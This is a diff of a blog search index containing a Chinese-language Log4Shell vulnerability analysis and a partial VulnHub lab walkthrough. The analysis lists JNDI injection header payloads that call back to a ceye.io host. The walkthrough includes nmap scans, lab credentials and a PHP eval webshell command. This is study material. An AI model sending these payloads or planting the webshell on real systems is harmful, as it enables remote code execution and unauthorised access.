@@ -143,87 +143,6 @@
       </tags>
   </entry>
   <entry>
-    <title>log4j漏洞分析及总结</title>
-    <url>/2022/12/11/11-12-28/</url>
-    <content><![CDATA[<h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
-<p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
-<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
-<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
-<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
-<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
-<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
-<p>我们经常会在日志中输出一些变量，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>
-
-<p>现在思考一个问题：</p>
-<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
-<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
-<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
-<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
-<p>log4j2常见的查找途径：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
-<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
-<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
-<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
-<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
-<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
-<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
-<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
-<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
-
-<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
-<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
-<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
-<p>进一步解析，发现是JNDI扩展内容。</p>
-<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
-<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
-<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
-<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
-<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
-<blockquote>
-<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
-</blockquote>
-<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
-<p>危险在哪里？</p>
-<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
-<p>这就是鼎鼎大名的JNDI注入攻击！</p>
-<p>其实除了LDAP，还有RMI的方式，</p>
-<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
-<p>JNVDI注入拓展:<a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
-<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>以及一些变形的payload:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
-<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
-<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
-<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
-<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
-<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
-<p>修复：</p>
-<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
-]]></content>
-      <categories>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>漏洞库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctf学习笔记</title>
     <url>/2022/10/19/10-48-16/</url>
     <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
@@ -345,6 +264,87 @@
       </tags>
   </entry>
   <entry>
+    <title>log4j漏洞分析及总结</title>
+    <url>/2022/12/11/11-12-28/</url>
+    <content><![CDATA[<h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
+<p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
+<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
+<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
+<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
+<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
+<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
+<p>我们经常会在日志中输出一些变量，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>
+
+<p>现在思考一个问题：</p>
+<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
+<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
+<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
+<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
+<p>log4j2常见的查找途径：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
+<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
+<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
+<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
+<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
+<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
+<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
+<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
+
+<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
+<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
+<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
+<p>进一步解析，发现是JNDI扩展内容。</p>
+<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
+<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
+<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
+<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
+<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
+<blockquote>
+<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
+</blockquote>
+<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
+<p>危险在哪里？</p>
+<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
+<p>这就是鼎鼎大名的JNDI注入攻击！</p>
+<p>其实除了LDAP，还有RMI的方式，</p>
+<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
+<p>JNVDI注入拓展:<a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
+<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以及一些变形的payload:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
+<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
+<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
+<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
+<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
+<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
+<p>修复：</p>
+<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
+]]></content>
+      <categories>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>漏洞库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shiro反序列化漏洞</title>
     <url>/2022/12/13/13-29-51/</url>
     <content><![CDATA[<h1 id="Shrio反序列化导致命令执行"><a href="#Shrio反序列化导致命令执行" class="headerlink" title="Shrio反序列化导致命令执行"></a>Shrio<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>导致命令执行</h1><h2 id="漏洞编号：CVE-2016-4437"><a href="#漏洞编号：CVE-2016-4437" class="headerlink" title="漏洞编号：CVE-2016-4437"></a>漏洞编号：CVE-2016-4437</h2><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088"> Shiro反序列化漏洞_風月长情的博客-CSDN博客_shiro反序列化漏洞</a></p>
@@ -366,109 +366,6 @@
       </categories>
       <tags>
         <tag>漏洞库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vlunhub noob靶场总结</title>
-    <url>/2022/11/01/14-23-40/</url>
-    <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
-<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
-<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
-<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
-<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
-<p>Windows：ipconfig</p>
-<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
-<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
-<p>使用nmap命令:</p>
-<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
-<p>（应该开单章来说明一下信息收集中的工具命令）</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
-<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
-<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
-<p>在cre.txt 文件中得到一串base64加密过的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>
-
-<p>解密得:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>
-
-<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
-<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
-<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
-<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
-<p>参考链接:<a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
-<p>具体破译我就不尝试了,直接抄袭</p>
-<p>最后得到ssh服务的登录账号密码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
-<p>如图箭头所示:</p>
-<p>成功远程登陆上ssh服务</p>
-<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
-<p>有一些是我在测试时添加到账号.</p>
-<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
-<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
-<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
-<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>
-
-<p>不成功:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>
-
-<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
-<p>但做好权限维持才是持久的道理.</p>
-<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
-<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
-<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>
-
-<p>但失败了,在命令里直接就将$_post给执行了</p>
